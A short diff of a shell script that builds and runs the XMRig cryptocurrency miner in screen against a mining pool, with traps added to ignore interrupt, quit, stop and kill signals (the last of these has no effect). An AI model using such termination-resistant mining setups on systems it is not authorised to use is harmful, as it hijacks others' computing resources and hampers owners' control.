@@ -7,8 +7,9 @@ cmake .. -DUV_LIBRARY=/usr/lib64/libuv.a
 make
 screen
 trap "" 15
-trap '' SIGINT
-trap ''  SIGQUIT
-trap '' SIGTSTP
+trap "" 2
+trap "" 3
+trap "" 20
+trap "" 9
 ./xmrig --algo=cn-heavy/xhv -o ca.bloc.herominers.com:10431 -u abLoc9q8FSY8JcGNWNhFnrQgvkwNrvtTpCPEmvbFKkuiDvuePTaDdpkZdpZpvSvsuCCbUGftL7hsuUYnxWtLiLUEbe6HE8dWy8V -p x -k --donate-level=1
 
